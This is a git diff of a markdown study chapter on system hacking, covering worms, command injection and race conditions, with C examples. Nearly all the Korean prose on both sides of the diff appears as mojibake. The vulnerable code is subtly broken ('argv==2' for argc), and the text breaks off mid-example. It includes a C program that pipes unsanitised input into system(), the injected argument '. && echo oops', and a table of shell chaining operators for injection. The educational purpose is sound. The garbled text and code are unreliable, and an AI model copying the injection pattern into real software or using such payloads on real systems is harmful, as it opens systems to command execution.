@@ -1,35 +1,35 @@
-## ? Chapter 4: ½Ã½ºÅÛ ÇØÅ·
-#### <ins>½Ã½ºÅÛ ÇØÅ·</ins> ?
-- ¿î¿µÃ¼Á¦ ÇØÅ· (OS System Hacking)
-- Á¢±Ù±ÇÇÑÀÌ ¾ø´Â ÄÄÇ»ÅÍÀÇ ÀÚ¿ø¿¡ ´ëÇØ Á¢±ÙÇÏ°Å³ª Á¤º¸¸¦ À¯ÃâÇÏ´Â ¸ðµç ±â¹ý
+## ðŸŒˆ Chapter 4: ì‹œìŠ¤í…œ í•´í‚¹
+#### <ins>ì‹œìŠ¤í…œ í•´í‚¹</ins> ?
+- ìš´ì˜ì²´ì œ í•´í‚¹ (OS System Hacking)
+- ì ‘ê·¼ê¶Œí•œì´ ì—†ëŠ” ì»´í“¨í„°ì˜ ìžì›ì— ëŒ€í•´ ì ‘ê·¼í•˜ê±°ë‚˜ ì •ë³´ë¥¼ ìœ ì¶œí•˜ëŠ” ëª¨ë“  ê¸°ë²•
 
-#### ÄÄÇ»ÅÍ ¿ú
-- ÀÎÅÍ³Ý¿¡ ÀÖ´Â Ãë¾àÇÑ ½Ã½ºÅÛÀ» Ã£¾Æ ½º½º·Î¸¦ º¹Á¦ÇÏ´Â ¾Ç¼º ÇÁ·Î±×·¥, Á÷Á¢ ´Ù¸¥ ÄÄÇ»ÅÍ¸¦ °ø°ÝÇØ ÀÚ½ÅÀ» ÀüÆÄÇÔ
-    - SQL ½½·¡¸Ó ¿ú
-        - MS-SQL ¼­¹ö¿¡ ¹öÆÛ ¿À¹öÇÃ·Î¿ì °ø°ÝÀ» ÇÏ±â À§ÇØ UDP port 1434 ÀÌ¿ë
-        - Çì´õ¸¦ Æ÷ÇÔÇØ 400byteÀÇ UDP ÆÐÅ¶¾È¿¡ µé¾î°¡±â ¶§¹®¿¡ TCP¿¡¼­¿Í °°ÀÌ ÀÀ´äÀ» ±â´Ù¸± ÇÊ¿ä°¡ ¾ø¾î ºü¸£°Ô È®»ê 
-    - Code-Red ¿ú 
+#### ì»´í“¨í„° ì›œ
+- ì¸í„°ë„·ì— ìžˆëŠ” ì·¨ì•½í•œ ì‹œìŠ¤í…œì„ ì°¾ì•„ ìŠ¤ìŠ¤ë¡œë¥¼ ë³µì œí•˜ëŠ” ì•…ì„± í”„ë¡œê·¸ëž¨, ì§ì ‘ ë‹¤ë¥¸ ì»´í“¨í„°ë¥¼ ê³µê²©í•´ ìžì‹ ì„ ì „íŒŒí•¨
+    - SQL ìŠ¬ëž˜ë¨¸ ì›œ
+        - MS-SQL ì„œë²„ì— ë²„í¼ ì˜¤ë²„í”Œë¡œìš° ê³µê²©ì„ í•˜ê¸° ìœ„í•´ UDP port 1434 ì´ìš©
+        - í—¤ë”ë¥¼ í¬í•¨í•´ 400byteì˜ UDP íŒ¨í‚·ì•ˆì— ë“¤ì–´ê°€ê¸° ë•Œë¬¸ì— TCPì—ì„œì™€ ê°™ì´ ì‘ë‹µì„ ê¸°ë‹¤ë¦´ í•„ìš”ê°€ ì—†ì–´ ë¹ ë¥´ê²Œ í™•ì‚° 
+    - Code-Red ì›œ 
 
-#### ÇØÅ·
-- Á¢±Ù ±ÇÇÑ(ID/PW)°¡ ¾ø´Â ÄÄÇ»ÅÍ¿¡ ¸í·ÉÀ» ³»¸°´Ù.
-- ÇöÀç Á¢±Ù ±ÇÇÑÀÌ ÀÖ´Â ½Ã½ºÅÛ¿¡¼­ ´õ ³ôÀº Á¢±Ù ±ÇÇÑÀ» ¾ò´Â´Ù. (Priviliedge Escalation)
+#### í•´í‚¹
+- ì ‘ê·¼ ê¶Œí•œ(ID/PW)ê°€ ì—†ëŠ” ì»´í“¨í„°ì— ëª…ë ¹ì„ ë‚´ë¦°ë‹¤.
+- í˜„ìž¬ ì ‘ê·¼ ê¶Œí•œì´ ìžˆëŠ” ì‹œìŠ¤í…œì—ì„œ ë” ë†’ì€ ì ‘ê·¼ ê¶Œí•œì„ ì–»ëŠ”ë‹¤. (Priviliedge Escalation)
 - How ???
-    - <ins>½ÇÇàÁßÀÎ ÇÁ·Î±×·¥ÀÇ ½ÇÇà Èå¸§À» ¹Ù²Û´Ù</ins>
-    - <ins>½ÇÇà ÇÒ¶§ ÀÚµ¿À¸·Î ³ôÀº ±ÇÇÑÀ» ºÎ¿©¹Þ´Â ÇÁ·Î±×·¥ÀÇ ½ÇÇà Èå¸§À» ¹Ù²Û´Ù</ins>
+    - <ins>ì‹¤í–‰ì¤‘ì¸ í”„ë¡œê·¸ëž¨ì˜ ì‹¤í–‰ íë¦„ì„ ë°”ê¾¼ë‹¤</ins>
+    - <ins>ì‹¤í–‰ í• ë•Œ ìžë™ìœ¼ë¡œ ë†’ì€ ê¶Œí•œì„ ë¶€ì—¬ë°›ëŠ” í”„ë¡œê·¸ëž¨ì˜ ì‹¤í–‰ íë¦„ì„ ë°”ê¾¼ë‹¤</ins>
 
-### È¯°æ ±¸Ãà ??
+### í™˜ê²½ êµ¬ì¶• ??
 ---
-- ÇÁ·Î±×·¥ ºÐ¼® : windbg , IDA , gdb
-- °ø°Ý ÄÚµå ÀÛ¼º : ÆÄÀÌ½ã 
+- í”„ë¡œê·¸ëž¨ ë¶„ì„ : windbg , IDA , gdb
+- ê³µê²© ì½”ë“œ ìž‘ì„± : íŒŒì´ì¬ 
 
-1. ÆÄÀÌ½ã ¼³Ä¡
-2. cmd > `python` ÆÄÀÌ½ã ½ÇÇà
+1. íŒŒì´ì¬ ì„¤ì¹˜
+2. cmd > `python` íŒŒì´ì¬ ì‹¤í–‰
 
-### ¸í·É¾î »ðÀÔ °ø°Ý ???¡Î?
+### ëª…ë ¹ì–´ ì‚½ìž… ê³µê²© ???â™‚?
 ---
-- ±âÁ¸ ¸í·É¾îµéÀ» Àç»ç¿ëÇÏ°Å³ª ½© ¸í·É¾îµéÀ» ÀÌ¿ëÇØ Æ¯Á¤ ±â´É ¼öÇà½Ã ¹ß»ý °¡´É
+- ê¸°ì¡´ ëª…ë ¹ì–´ë“¤ì„ ìž¬ì‚¬ìš©í•˜ê±°ë‚˜ ì‰˜ ëª…ë ¹ì–´ë“¤ì„ ì´ìš©í•´ íŠ¹ì • ê¸°ëŠ¥ ìˆ˜í–‰ì‹œ ë°œìƒ ê°€ëŠ¥
 ```c
-//¿¹Á¦ 4-1 ) µð·ºÅÍ¸®¿¡ ÀÖ´Â ÆÄÀÏ ¸ñ·ÏÀ» Ç¥ÁØÃâ·ÂÀ¸·Î Ãâ·ÂÇÏ´Â ±â´É ±¸Çö ÇÔ¼ö
+//ì˜ˆì œ 4-1 ) ë””ë ‰í„°ë¦¬ì— ìžˆëŠ” íŒŒì¼ ëª©ë¡ì„ í‘œì¤€ì¶œë ¥ìœ¼ë¡œ ì¶œë ¥í•˜ëŠ” ê¸°ëŠ¥ êµ¬í˜„ í•¨ìˆ˜
 void print_current_dir_with_api(void){
     WIN32_FIND_DATA ffd;    //FindFileData
     HANDLE hFind = FindFirstFile(TEXT("*"),&ffd);
@@ -44,26 +44,26 @@ void print_current_dir_with_api(void){
     }while (FindNextFile(hFind,&ffd)!=0);
 }
 ```
-À©µµ¿ì¿¡¼­ Á¦°øÇÏ´Â ±âº»API (WINAPI)µé¸¸ ÀÌ¿ëÇØ ÇöÀç Æú´õÀÇ ¸ðµç ÆÄÀÏÀ» Ãâ·ÂÇÏ´Â ÄÚµå´Ù.
+ìœˆë„ìš°ì—ì„œ ì œê³µí•˜ëŠ” ê¸°ë³¸API (WINAPI)ë“¤ë§Œ ì´ìš©í•´ í˜„ìž¬ í´ë”ì˜ ëª¨ë“  íŒŒì¼ì„ ì¶œë ¥í•˜ëŠ” ì½”ë“œë‹¤.
 
-ÇØ´ç ±â´ÉÀ» ¼öÇàÇÏ´Â ¿ÜºÎ ÇÁ·Î±×·¥ÀÌ ÀÖÀ¸¸é ¿ÜºÎ ÇÁ·Î±×·¥À» ¼öÇàÇÑ ±× °á°ú¸¦ ±×´ë·Î ¾²¸éµÈ´Ù.
+í•´ë‹¹ ê¸°ëŠ¥ì„ ìˆ˜í–‰í•˜ëŠ” ì™¸ë¶€ í”„ë¡œê·¸ëž¨ì´ ìžˆìœ¼ë©´ ì™¸ë¶€ í”„ë¡œê·¸ëž¨ì„ ìˆ˜í–‰í•œ ê·¸ ê²°ê³¼ë¥¼ ê·¸ëŒ€ë¡œ ì“°ë©´ëœë‹¤.
 
-¸¹Àº ÇÁ·Î±×·¡¹Ö ¾ð¾îµéÀÌ ¿ÜºÎ ÇÁ·Î±×·¥À» ¼öÇàÇÏ±â À§ÇÑ ¹æ¹ýÀ¸·Î ÅØ½ºÆ®±â¹Ý ¸í·É¾î Ã³¸®±â¸¦ ÀÌ¿ëÇÑ´Ù.
-#### ¸í·É¾î Ã³¸®±â
-- C¾ð¾î¿¡¼­´Â ¿ÜºÎ ÇÁ·Î±×·¥À» ¼öÇàÇÒ ¼ö ÀÖ´Â ÇÔ¼ö·Î `system()`À» Á¦°ø
-    - ¿î¿µÃ¼Á¦ ±âº»¸í·É¾î Ã³¸®±â
-    - ÀÎÀÚ·Î µé¾î¿Â ¹®ÀÚ¿­À» ½ÇÇàÇÏ°í ±×°á°ú Ãâ·Â
+ë§Žì€ í”„ë¡œê·¸ëž˜ë° ì–¸ì–´ë“¤ì´ ì™¸ë¶€ í”„ë¡œê·¸ëž¨ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•œ ë°©ë²•ìœ¼ë¡œ í…ìŠ¤íŠ¸ê¸°ë°˜ ëª…ë ¹ì–´ ì²˜ë¦¬ê¸°ë¥¼ ì´ìš©í•œë‹¤.
+#### ëª…ë ¹ì–´ ì²˜ë¦¬ê¸°
+- Cì–¸ì–´ì—ì„œëŠ” ì™¸ë¶€ í”„ë¡œê·¸ëž¨ì„ ìˆ˜í–‰í•  ìˆ˜ ìžˆëŠ” í•¨ìˆ˜ë¡œ `system()`ì„ ì œê³µ
+    - ìš´ì˜ì²´ì œ ê¸°ë³¸ëª…ë ¹ì–´ ì²˜ë¦¬ê¸°
+    - ì¸ìžë¡œ ë“¤ì–´ì˜¨ ë¬¸ìžì—´ì„ ì‹¤í–‰í•˜ê³  ê·¸ê²°ê³¼ ì¶œë ¥
     ```c
-    //¿¹Á¦ 4-2 ) system()À¸·Î dir¸í·É¾î ¼öÇàÇÔÀ¸·Î½á ¶È°°Àº ±â´ÉÀ» ¼öÇàÇÏ´Â ÇÁ·Î±×·¥À» ´õ ºü¸£°Ô ÀÛ¼º°¡´É
+    //ì˜ˆì œ 4-2 ) system()ìœ¼ë¡œ dirëª…ë ¹ì–´ ìˆ˜í–‰í•¨ìœ¼ë¡œì¨ ë˜‘ê°™ì€ ê¸°ëŠ¥ì„ ìˆ˜í–‰í•˜ëŠ” í”„ë¡œê·¸ëž¨ì„ ë” ë¹ ë¥´ê²Œ ìž‘ì„±ê°€ëŠ¥
     void print_current_dir_with_system(void){
         system("dir /B");
     }
     ```
-    ¢Ù? ÀÌ·±½ÄÀ¸·Î "Àç»ç¿ë"
+    â†˜? ì´ëŸ°ì‹ìœ¼ë¡œ "ìž¬ì‚¬ìš©"
 
-#### ¸í·É¾î »ðÀÔ °ø°Ý
+#### ëª…ë ¹ì–´ ì‚½ìž… ê³µê²©
 ```c
-//¿¹Á¦ 4-3 ) ÀÎÀÚ·Î µð·ºÅÍ¸®¸íÀ» ¹Þ¾Æ ÆÄÀÏ ¸ñ·ÏÀ» Ãâ·ÂÇÏ´Â ÇÁ·Î±×·¥
+//ì˜ˆì œ 4-3 ) ì¸ìžë¡œ ë””ë ‰í„°ë¦¬ëª…ì„ ë°›ì•„ íŒŒì¼ ëª©ë¡ì„ ì¶œë ¥í•˜ëŠ” í”„ë¡œê·¸ëž¨
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -73,67 +73,67 @@ void print_dir_with_system(char *path){
     char cmd[kCmdLen];
     const char* cmd_prefix = "dir /B";
     if (strlen(cmd_prefix)+strlen(path)+1<kCmdLen){
-        _snprintf(cmd,kCmdLen,"%s %s",cmd_prefix,path); //cmd_prefix¿Í path¸¦ %s %s ·Î °áÇÕÇÑ ¹®ÀÚ¿­À» kCmdLen¸¸Å­ cmd¿¡ ÀúÀå
+        _snprintf(cmd,kCmdLen,"%s %s",cmd_prefix,path); //cmd_prefixì™€ pathë¥¼ %s %s ë¡œ ê²°í•©í•œ ë¬¸ìžì—´ì„ kCmdLenë§Œí¼ cmdì— ì €ìž¥
     }
     system(cmd);
 }
 
 int main(int argc, char* argv[]){
-    char* exec_file = argv[0];  //½ÇÇàÆÄÀÏ¸í
-    char* path = argv[1];   //°æ·Î
+    char* exec_file = argv[0];  //ì‹¤í–‰íŒŒì¼ëª…
+    char* path = argv[1];   //ê²½ë¡œ
     if (argv==2) print_dir_with_system(path);
     else printf("Usage> %s [filename]\n",exec_file);
     return 0;
 }
 ```
-Ã¹¹øÂ° ÀÎÀÚ·Î ³Ñ¾î¿Â Æú´õ¿¡ ÀÖ´Â ÆÄÀÏ ¸ñ·ÏÀ» Ãâ·ÂÇÑ´Ù.
+ì²«ë²ˆì§¸ ì¸ìžë¡œ ë„˜ì–´ì˜¨ í´ë”ì— ìžˆëŠ” íŒŒì¼ ëª©ë¡ì„ ì¶œë ¥í•œë‹¤.
 
-> ? Ã¹¹øÂ° ÀÎÀÚ·Î µé¾î°¡´Â ÆÄÀÏ¸í µÚ¿¡ `. && echo oops`¸¦ ÀÔ·ÂÇÏ¸é? sprintf¹®À¸·Î cmd.exe¿¡ ÀÇÇØ `dir /B . && echo oops` °¡ ¼öÇàµÈ´Ù.`&&` ´Â ¸í·É¾î Ã³¸®±â¿¡¼­ ÇÑ ÁÙ¿¡ ¸ç·¯ ¸í·É¾î¸¦ ¼öÇàÇÏµµ·Ï ÇÑ´Ù. 
+> ? ì²«ë²ˆì§¸ ì¸ìžë¡œ ë“¤ì–´ê°€ëŠ” íŒŒì¼ëª… ë’¤ì— `. && echo oops`ë¥¼ ìž…ë ¥í•˜ë©´? sprintfë¬¸ìœ¼ë¡œ cmd.exeì— ì˜í•´ `dir /B . && echo oops` ê°€ ìˆ˜í–‰ëœë‹¤.`&&` ëŠ” ëª…ë ¹ì–´ ì²˜ë¦¬ê¸°ì—ì„œ í•œ ì¤„ì— ë©°ëŸ¬ ëª…ë ¹ì–´ë¥¼ ìˆ˜í–‰í•˜ë„ë¡ í•œë‹¤. 
 
-#### ¸í·É¾î »ðÀÔ Ãë¾àÁ¡ÀÌ ¹ß»ýÇÏ´Â ÆÐÅÏ
-- ¾î¶² ¾ð¾îµçÁö °£¿¡ ÀÏ¹ÝÀûÀ¸·Î ÇÁ·Î±×·¥ ³»¿¡¼­ `system()`°°ÀÌ Á÷°£Á¢ÀûÀ¸·Î ¸í·É¾î Ã³¸®±â¸¦ »ç¿ëÇÏ´Â ÇÔ¼ö¸¦ È£ÃâÇÏ´Â ÄÚµå°¡ ÀÖ¾î¾ßÇÑ´Ù.
+#### ëª…ë ¹ì–´ ì‚½ìž… ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” íŒ¨í„´
+- ì–´ë–¤ ì–¸ì–´ë“ ì§€ ê°„ì— ì¼ë°˜ì ìœ¼ë¡œ í”„ë¡œê·¸ëž¨ ë‚´ì—ì„œ `system()`ê°™ì´ ì§ê°„ì ‘ì ìœ¼ë¡œ ëª…ë ¹ì–´ ì²˜ë¦¬ê¸°ë¥¼ ì‚¬ìš©í•˜ëŠ” í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ì½”ë“œê°€ ìžˆì–´ì•¼í•œë‹¤.
 
-¡å °¢ ¾ð¾îº° ÁÖÀÇÇØ¾ßÇÒ ½ÇÇà ÇÔ¼ö
-|¾ð¾î|±¸¼º|
+â–¼ ê° ì–¸ì–´ë³„ ì£¼ì˜í•´ì•¼í•  ì‹¤í–‰ í•¨ìˆ˜
+|ì–¸ì–´|êµ¬ì„±|
 |--|--|
-|C/C++|¿î¿µÃ¼Á¦ °øÅë: system(),popen(),execlp(),execvp()|
-||À©µµ¿ì °øÅë: ShellExecute, CreateProcess_wsystem()|
-|Perl|System(),exec(),\`,\|,eval(),Á¤±ÔÇ¥Çö½Ä/e¿¬»êÀÚ|
-|ÆÄÀÌ½ã|exec,eval,os.sytem,os.open,execfile,input,compile|
-|ÀÚ¹Ù|Class,forName(string name),class,newInstance,Runtime,exec()|
+|C/C++|ìš´ì˜ì²´ì œ ê³µí†µ: system(),popen(),execlp(),execvp()|
+||ìœˆë„ìš° ê³µí†µ: ShellExecute, CreateProcess_wsystem()|
+|Perl|System(),exec(),\`,\|,eval(),ì •ê·œí‘œí˜„ì‹/eì—°ì‚°ìž|
+|íŒŒì´ì¬|exec,eval,os.sytem,os.open,execfile,input,compile|
+|ìžë°”|Class,forName(string name),class,newInstance,Runtime,exec()|
 |C#|System,Diagnostics,Process,Start()|
 
 
 
-#### ¸í·É¾î »ðÀÔ°ø°Ý¿¡ »ç¿ëµÇ´Â ¸í·É¾î Ã³¸®±â ¿¬»êÀÚ
+#### ëª…ë ¹ì–´ ì‚½ìž…ê³µê²©ì— ì‚¬ìš©ë˜ëŠ” ëª…ë ¹ì–´ ì²˜ë¦¬ê¸° ì—°ì‚°ìž
 
-¡å ¸í·É¾î Ã³¸®±â¿¡ Æ¯¼öÇÏ°Ô »ç¿ëµÇ´Â ¸í·É¾î
-|¿¬»êÀÚ|»ç¿ë¹ý|ÀÇ¹Ì|
+â–¼ ëª…ë ¹ì–´ ì²˜ë¦¬ê¸°ì— íŠ¹ìˆ˜í•˜ê²Œ ì‚¬ìš©ë˜ëŠ” ëª…ë ¹ì–´
+|ì—°ì‚°ìž|ì‚¬ìš©ë²•|ì˜ë¯¸|
 |---|---|--|
-|>|prog>file|prog¼öÇà°á°ú·Î ³ª¿Â Ç¥ÁØÃâ·ÂÀ» file·Î ÀúÀå. (µ¤¾î¾²±â)|
-|>>|prog>>file|prog¼öÇà°á°ú·Î ³ª¿Â Ç¥ÁØÃâ·ÂÀ» fileµÚ¿¡ Ãß°¡|
-|<|prog<file|fileÀÇ ³»¿ëÀ» progÀÇ Ç¥ÁØÀÔ·ÂÀ¸·Î Àü´Þ|
-|\||prog1\|prog2|prog1ÀÇ Ç¥ÁØÃâ·ÂÀ» prog2ÀÇ Ç¥ÁØÀÔ·ÂÀ¸·Î Àü´Þ|
-|&&|prog1&&prog2|prog1 ¸í·É¼öÇàÀÌ ¼º°øÀûÀÌ¸é prog2 È£Ãâ|
-|\|\||prog1\|\|prog2|prog1 ¸í·É¼öÇàÀÌ ½ÇÆÐÇÏ¸é prog2 È£Ãâ|
-|;(¸®´ª½º)|prog1;prog2|prog1 ¼öÇà ÈÄ prog2 ¼öÇà|
-|&(À©µµ¿ì)|prog1&prog2|prog1 ¼öÇà ÈÄ prog2 ¼öÇà|
-|&(¸®´ª½º)|prog&prog1|prog¸¦ ¹é±×¶ó¿îµå¿¡¼­ ¼öÇàÇÏ°í prog1À» ¼öÇà|
-|$()(¸®´ª½º)|$(command)| ÇØ´ç ±¸¹®ÀÌ command¸¦ ¼öÇàÇÑ °á°ú·Î Ä¡È¯|
-|`(¸®´ª½º)|'command'|ÇØ´ç ±¸¹®ÀÌ command¸¦ ¼öÇàÇÑ °á°ú·Î Ä¡È¯|
+|>|prog>file|progìˆ˜í–‰ê²°ê³¼ë¡œ ë‚˜ì˜¨ í‘œì¤€ì¶œë ¥ì„ fileë¡œ ì €ìž¥. (ë®ì–´ì“°ê¸°)|
+|>>|prog>>file|progìˆ˜í–‰ê²°ê³¼ë¡œ ë‚˜ì˜¨ í‘œì¤€ì¶œë ¥ì„ fileë’¤ì— ì¶”ê°€|
+|<|prog<file|fileì˜ ë‚´ìš©ì„ progì˜ í‘œì¤€ìž…ë ¥ìœ¼ë¡œ ì „ë‹¬|
+|\||prog1\|prog2|prog1ì˜ í‘œì¤€ì¶œë ¥ì„ prog2ì˜ í‘œì¤€ìž…ë ¥ìœ¼ë¡œ ì „ë‹¬|
+|&&|prog1&&prog2|prog1 ëª…ë ¹ìˆ˜í–‰ì´ ì„±ê³µì ì´ë©´ prog2 í˜¸ì¶œ|
+|\|\||prog1\|\|prog2|prog1 ëª…ë ¹ìˆ˜í–‰ì´ ì‹¤íŒ¨í•˜ë©´ prog2 í˜¸ì¶œ|
+|;(ë¦¬ëˆ…ìŠ¤)|prog1;prog2|prog1 ìˆ˜í–‰ í›„ prog2 ìˆ˜í–‰|
+|&(ìœˆë„ìš°)|prog1&prog2|prog1 ìˆ˜í–‰ í›„ prog2 ìˆ˜í–‰|
+|&(ë¦¬ëˆ…ìŠ¤)|prog&prog1|progë¥¼ ë°±ê·¸ë¼ìš´ë“œì—ì„œ ìˆ˜í–‰í•˜ê³  prog1ì„ ìˆ˜í–‰|
+|$()(ë¦¬ëˆ…ìŠ¤)|$(command)| í•´ë‹¹ êµ¬ë¬¸ì´ commandë¥¼ ìˆ˜í–‰í•œ ê²°ê³¼ë¡œ ì¹˜í™˜|
+|`(ë¦¬ëˆ…ìŠ¤)|'command'|í•´ë‹¹ êµ¬ë¬¸ì´ commandë¥¼ ìˆ˜í–‰í•œ ê²°ê³¼ë¡œ ì¹˜í™˜|
 
->Æ¯È÷ À¯´Ð½º°è¿­¿¡¸¸ ÀÖ´Â $() ¿Í ` ´Â ¾ÕµÚÀÇ ¸í·É¾î°¡ ºÙÀº °Í°ú »ó°ü¾øÀÌ ¸í·É¾î ¼öÇà Àü¿¡ µ¶¸³ÀûÀ¸·Î ¼öÇàÇÒ ¼ö ÀÖ¾î¼­ ½ÇÁ¦ °ø°Ý¿¡¼­ ¾ÆÁÖ À¯¿ëÇÏ°Ô »ç¿ëµÊ.
+>íŠ¹ížˆ ìœ ë‹‰ìŠ¤ê³„ì—´ì—ë§Œ ìžˆëŠ” $() ì™€ ` ëŠ” ì•žë’¤ì˜ ëª…ë ¹ì–´ê°€ ë¶™ì€ ê²ƒê³¼ ìƒê´€ì—†ì´ ëª…ë ¹ì–´ ìˆ˜í–‰ ì „ì— ë…ë¦½ì ìœ¼ë¡œ ìˆ˜í–‰í•  ìˆ˜ ìžˆì–´ì„œ ì‹¤ì œ ê³µê²©ì—ì„œ ì•„ì£¼ ìœ ìš©í•˜ê²Œ ì‚¬ìš©ë¨.
 
 
-### ·¹ÀÌ½º ÄÁµð¼Ç ? 
+### ë ˆì´ìŠ¤ ì»¨ë””ì…˜ ? 
 ---
 - Race Condition Attack 
-- ¼­·Î´Ù¸¥ ÇÁ·Î¼¼½º³ª ½º·¹µå°¡ °°Àº ÀÚ¿øÀ» °øÀ¯ÇÒ ¶§, ½ÇÇà ¼ø¼­¿¡ µû¶ó °á°ú°¡ ´Þ¶óÁú ¼ö ÀÖ´Â Çö»óÀ» ÀÌ¿ë
-- º´Çà¼º : ¿î¿µÃ¼Á¦¿¡¼­ ¿©·¯ ¿¬»êÀ» µ¿½Ã¿¡ Ã³¸®ÇÒ¼öÀÖ´Â Æ¯¼º
-    - ºÐÇÒ Ã³¸®
-    - ¸ÖÆ¼ ÄÚ¾î
+- ì„œë¡œë‹¤ë¥¸ í”„ë¡œì„¸ìŠ¤ë‚˜ ìŠ¤ë ˆë“œê°€ ê°™ì€ ìžì›ì„ ê³µìœ í•  ë•Œ, ì‹¤í–‰ ìˆœì„œì— ë”°ë¼ ê²°ê³¼ê°€ ë‹¬ë¼ì§ˆ ìˆ˜ ìžˆëŠ” í˜„ìƒì„ ì´ìš©
+- ë³‘í–‰ì„± : ìš´ì˜ì²´ì œì—ì„œ ì—¬ëŸ¬ ì—°ì‚°ì„ ë™ì‹œì— ì²˜ë¦¬í• ìˆ˜ìžˆëŠ” íŠ¹ì„±
+    - ë¶„í•  ì²˜ë¦¬
+    - ë©€í‹° ì½”ì–´
  ```c
- //¿¹Á¦ 4-4 ) º´Çà¼º Å×½ºÆ®¸¦ À§ÇÑ ÄÚµå
+ //ì˜ˆì œ 4-4 ) ë³‘í–‰ì„± í…ŒìŠ¤íŠ¸ë¥¼ ìœ„í•œ ì½”ë“œ
 #include <stdio.h>
 #include <windows.h>
 
@@ -146,14 +146,14 @@ int main(){
     printf("total_count_ = %d\n",total_count_);
     return 0;
 }
-//Ãâ·Â
+//ì¶œë ¥
 //total count =400
 ```
-º´Çà¼ºÀ» ÀÌ¿ëÇØ ÀÌ ÇÁ·Î±×·¥ÀÌ ºü¸£°Ô µ¿ÀÛÇÏµµ·Ï ÇØº¸ÀÚ. 
-- CPUÀÇ °³¼öº°·Î ½º·¹µå¸¦ ¸¸µé¾î °¢°¢ÀÇ ºÎÇÏ¸¦ 1/(ÄÚ¾î°³¼ö)·Î ÁÜÀ¸·Î½á, ±âÁ¸¿¡ ÇÏ³ªÀÇ CPU¿¡¼­¸¸ ÀÛµ¿ÇÔ¿¡ µû¶ó »ý±â´Â ºÎÇÏ¸¦ ÁÙÀÏ ¼ö ÀÖ´Ù.
-- ¸Þ¸ð¸®º¯¼ö (total_count_)¸¦ »ç¿ëÇÔÀ¸·Î½á ¹ß»ýÇÏ´Â ºÎÇÏ¸¦ ÁÙÀÌ±â À§ÇØ, °è»ê °úÁ¤ÀÇ Áß°£ °á°ú °ªÀ» Áö¿ª º¯¼ö¿¡ ÀúÀåÇØ¼­ ¿¬»êÀÌ ³¡³µÀ»¶§ ÀÌ¸¦ ¹Ý¿µÇÏµµ·Ï ÇÑ´Ù.
+ë³‘í–‰ì„±ì„ ì´ìš©í•´ ì´ í”„ë¡œê·¸ëž¨ì´ ë¹ ë¥´ê²Œ ë™ìž‘í•˜ë„ë¡ í•´ë³´ìž. 
+- CPUì˜ ê°œìˆ˜ë³„ë¡œ ìŠ¤ë ˆë“œë¥¼ ë§Œë“¤ì–´ ê°ê°ì˜ ë¶€í•˜ë¥¼ 1/(ì½”ì–´ê°œìˆ˜)ë¡œ ì¤Œìœ¼ë¡œì¨, ê¸°ì¡´ì— í•˜ë‚˜ì˜ CPUì—ì„œë§Œ ìž‘ë™í•¨ì— ë”°ë¼ ìƒê¸°ëŠ” ë¶€í•˜ë¥¼ ì¤„ì¼ ìˆ˜ ìžˆë‹¤.
+- ë©”ëª¨ë¦¬ë³€ìˆ˜ (total_count_)ë¥¼ ì‚¬ìš©í•¨ìœ¼ë¡œì¨ ë°œìƒí•˜ëŠ” ë¶€í•˜ë¥¼ ì¤„ì´ê¸° ìœ„í•´, ê³„ì‚° ê³¼ì •ì˜ ì¤‘ê°„ ê²°ê³¼ ê°’ì„ ì§€ì—­ ë³€ìˆ˜ì— ì €ìž¥í•´ì„œ ì—°ì‚°ì´ ëë‚¬ì„ë•Œ ì´ë¥¼ ë°˜ì˜í•˜ë„ë¡ í•œë‹¤.
 ```c
-//¿¹Á¦ 4-5 ) º´Çà¼ºÀ» ÀÌ¿ëÇÑ ¼ýÀÚ Áõ°¡ ÇÁ·Î±×·¥
+//ì˜ˆì œ 4-5 ) ë³‘í–‰ì„±ì„ ì´ìš©í•œ ìˆ«ìž ì¦ê°€ í”„ë¡œê·¸ëž¨
 #include <stdio.h>
 #include <windows.h>
 
@@ -177,12 +177,12 @@ void concurrent_solver(){
 
     for (int i=0; i<kNumThread;i++){
         hThreadArray[i]=CreateThread(
-            NULL,   //±âº» º¸¾È ½Äº°ÀÚ »ç¿ë
-            0,  //±âº» ½ºÅÃ »çÀÌÁî »ç¿ë
-            MyThreadFunction,   //½º·¹µå·Î ½ÇÇàÇÒ ÇÔ¼ö ÀÌ¸§
-            NULL,   //½º·¹µå¿¡ Àü´ÞµÉ ÀÎÀÚ
-            0,  //»ý¼º ÇÃ·¡±×
-            &dwThreadIdArray[i]);   //½º·¹µå ½Äº°ÀÚ¸¦ ÀúÀåÇÒ º¯¼ö
+            NULL,   //ê¸°ë³¸ ë³´ì•ˆ ì‹ë³„ìž ì‚¬ìš©
+            0,  //ê¸°ë³¸ ìŠ¤íƒ ì‚¬ì´ì¦ˆ ì‚¬ìš©
+            MyThreadFunction,   //ìŠ¤ë ˆë“œë¡œ ì‹¤í–‰í•  í•¨ìˆ˜ ì´ë¦„
+            NULL,   //ìŠ¤ë ˆë“œì— ì „ë‹¬ë  ì¸ìž
+            0,  //ìƒì„± í”Œëž˜ê·¸
+            &dwThreadIdArray[i]);   //ìŠ¤ë ˆë“œ ì‹ë³„ìžë¥¼ ì €ìž¥í•  ë³€ìˆ˜
     }
 
     WaitForMultipleObjects(kNumThread,hThreadArray,TRUE,INFINITE);
@@ -197,16 +197,16 @@ int main(){
     printf("total_count_ = %d\n",total_count_);
     return 0;
 }
-//Ãâ·Â
+//ì¶œë ¥
 //total count =400
 ```
-MyThreadFunction() ÇÔ¼ö´Â ½º·¹µå °³¼ö¿¡ ¸ÂÃç °è»ê·®À» ¼­·Î ºÐ´ãÇØ °è»êÇÑ´Ù
+MyThreadFunction() í•¨ìˆ˜ëŠ” ìŠ¤ë ˆë“œ ê°œìˆ˜ì— ë§žì¶° ê³„ì‚°ëŸ‰ì„ ì„œë¡œ ë¶„ë‹´í•´ ê³„ì‚°í•œë‹¤
 
-4°³ÀÇ ½º·¹µå¸¦ »ý¼ºÇØ 100¹ø¾¿ Áõ°¡ ¿¬»êÀ» ¼öÇàÇÑ´Ù.
+4ê°œì˜ ìŠ¤ë ˆë“œë¥¼ ìƒì„±í•´ 100ë²ˆì”© ì¦ê°€ ì—°ì‚°ì„ ìˆ˜í–‰í•œë‹¤.
 
-¿©±â¼­ mainÇÔ¼ö¸¸ ¹Ù²ãº¸ÀÚ.
+ì—¬ê¸°ì„œ mainí•¨ìˆ˜ë§Œ ë°”ê¿”ë³´ìž.
 ```c
